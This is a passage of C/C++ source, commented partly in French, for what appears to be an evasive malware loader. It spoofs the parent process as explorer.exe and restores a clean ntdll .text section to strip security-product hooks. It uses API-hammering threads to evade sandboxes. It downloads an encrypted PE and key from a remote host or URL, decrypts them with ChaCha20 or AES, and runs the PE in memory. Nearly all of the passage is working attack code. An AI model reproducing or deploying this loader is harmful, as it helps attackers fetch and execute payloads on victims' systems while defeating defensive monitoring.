            hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                pe32.dwSize = sizeof(PROCESSENTRY32A);
                if (pProcess32First(hSnapshot, &pe32)) {
                    do {
                        if (_stricmp(pe32.szExeFile, "explorer.exe") == 0) {
                            explorerPID = pe32.th32ProcessID;
                            break;
                        }
                    } while (pProcess32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
            }
        }
        FreeLibrary(hKernel32);
    }
    
    DWORD dwCreationFlags = CREATE_SUSPENDED;
    
    // Si on a trouvé explorer.exe, on utilise le PPID spoofing
    if (explorerPID != 0) {
        if (SpoofPPID(explorerPID, &sie)) {
            dwCreationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        }
    }

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, 
                   dwCreationFlags, NULL, NULL, &sie.StartupInfo, &pi);

    if (!pi.hProcess)
    {
        printf("[-] Error creating process\r\n");
        return NULL;
    }

    //Get base address of NTDLL
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi;
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));

    pntdll = HeapAlloc(GetProcessHeap(), 0, mi.SizeOfImage);
    SIZE_T dwRead;
    BOOL bSuccess = ReadProcessMemory(pi.hProcess, (LPCVOID)mi.lpBaseOfDll, pntdll, mi.SizeOfImage, &dwRead);
    if (!bSuccess) {
        printf("Failed in reading ntdll (%u)\n", GetLastError());
        return NULL;
    }

    TerminateProcess(pi.hProcess, 0);
    
    // Plus d'API hammering après la lecture
    APIHammer();
    
    return pntdll;
}


BOOL Unhook(LPVOID cleanNtdll) {

    char nt[] = { 'n','t','d','l','l','.','d','l','l', 0 };

    HANDLE hNtdll = GetModuleHandleA(nt);
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((DWORD64)cleanNtdll + DOSheader->e_lfanew);
    int i;


    // find .text section
    for (i = 0; i < NTheader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHdr = (PIMAGE_SECTION_HEADER)((DWORD64)IMAGE_FIRST_SECTION(NTheader) + ((DWORD64)IMAGE_SIZEOF_SECTION_HEADER * i));

        char txt[] = { '.','t','e','x','t', 0 };

        if (!strcmp((char*)sectionHdr->Name, txt)) {

            // prepare ntdll.dll memory region for write permissions.
            BOOL ProtectStatus1 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!ProtectStatus1) {
                printf("Failed to change the protection (%u)\n", GetLastError());
                return FALSE;
            }

            // copy .text section from the mapped ntdll to the hooked one
            memcpy((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress), (LPVOID)((DWORD64)cleanNtdll + sectionHdr->VirtualAddress), sectionHdr->Misc.VirtualSize);


            // restore original protection settings of ntdll
            BOOL ProtectStatus2 = VirtualProtect((LPVOID)((DWORD64)hNtdll + sectionHdr->VirtualAddress),
                sectionHdr->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!ProtectStatus2) {
                printf("Failed to change the protection back (%u)\n", GetLastError());
                return FALSE;
            }

        }
    }

    return TRUE;

}


int main(int argc, char** argv) {

        // Démarrer l'API hammering dès le début
        std::thread initial_hammer(APIHammer);
        initial_hammer.detach();

        if (argc != 5 && argc != 3) {
            printf("[+] Usage Option 1: %s <Host> <Port> <Cipher_Path> <Key_Path>\n", argv[0]);
            printf("[+] Usage Option 2: %s <Full_Cipher_URL> <Full_Key_URL>\n", argv[0]);
            printf("[+] Examples:\n");
            printf("    %s 192.168.1.100 8080 /cipher_chacha20.bin /key_chacha20.bin\n", argv[0]);
            printf("    %s https://myserver.com/cipher_chacha20.bin https://myserver.com/key_chacha20.bin\n", argv[0]);
            return 1;
        }

        DATA PE, keyData;
        
        if (argc == 3) {
            // Mode URL complète
            printf("\n\n[+] Get Encrypted PE from URL: %s\n", argv[1]);
            PE = GetDataFromURL(argv[1]);
            if (!PE.data) {
                printf("[-] Failed in getting Encrypted PE from URL\n");
                return -1;
            }

            printf("\n[+] Get Key from URL: %s\n", argv[2]);
            keyData = GetDataFromURL(argv[2]);
            if (!keyData.data) {
                printf("[-] Failed in getting key from URL\n");
                return -2;
            }
        } else {
            // Mode classique host:port
            char* host = argv[1];
            DWORD port = atoi(argv[2]);
            char* pe = argv[3];
            char* key = argv[4];

            const size_t cSize1 = strlen(host) + 1;
            wchar_t* whost = new wchar_t[cSize1];
            mbstowcs(whost, host, cSize1);

            const size_t cSize2 = strlen(pe) + 1;
            wchar_t* wpe = new wchar_t[cSize2];
            mbstowcs(wpe, pe, cSize2);

            const size_t cSize3 = strlen(key) + 1;
            wchar_t* wkey = new wchar_t[cSize3];
            mbstowcs(wkey, key, cSize3);

            // Plus d'API hammering pendant les conversions
            APIHammer();

            printf("\n\n[+] Get Encrypted PE from %s:%d\n", host, port);
            PE = GetData(whost, port, wpe);
            if (!PE.data) {
                printf("[-] Failed in getting Encrypted PE\n");
                return -1;
            }

            printf("\n[+] Get Key from %s:%d\n", host, port);
            keyData = GetData(whost, port, wkey);
            if (!keyData.data) {
                printf("[-] Failed in getting key\n");
                return -2;
            }
        }
        printf("\n[+] Encrypted PE Address : %p\n", PE.data);
        printf("\n[+] Key Address : %p\n", keyData.data);
        
        // Détecter le type de chiffrement - par défaut ChaCha20 si la clé fait 32 bytes
        printf("\n[+] Decrypt the PE\n");
        
        bool useChaCha20 = false;
        
        if (argc == 3) {
            // Mode URL - détecter par le nom du fichier
            if (strstr(argv[1], "chacha20") || strstr(argv[1], "CHACHA20")) {
                useChaCha20 = true;
            }
        } else {
            // Mode classique - détecter par le paramètre
            char cipher_upper[32] = {0};
            for (int i = 0; i < strlen(argv[3]) && i < 31; i++) {
                cipher_upper[i] = toupper(argv[3][i]);
            }
            if (strstr(cipher_upper, "CHACHA") != NULL || strstr(cipher_upper, "CHACHA20") != NULL) {
                useChaCha20 = true;
            }
        }
        
        // Si la clé fait 32 bytes et qu'on ne sait pas, présumer ChaCha20
        if (!useChaCha20 && keyData.len == 32) {
            useChaCha20 = true;
            printf("[+] Key size indicates ChaCha20 encryption\n");
        }
        
        if (useChaCha20) {
            printf("[+] Using ChaCha20 decryption\n");
            DecryptChaCha20((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
        } else {
            printf("[+] Using AES decryption\n");
            DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
        }
        
        printf("\n[+] PE Decrypted\n");

        // Fixing command line
        sz_masqCmd_Ansi = (char*)"whatEver";
        
        // API hammering final avant l'exécution
        std::thread final_hammer(APIHammer);
        final_hammer.detach();
        
        printf("\n[+] Loading and Running PE\n");
        PELoader((char*)PE.data, PE.len);

        printf("\n[+] Finished\n");

    return 0;
}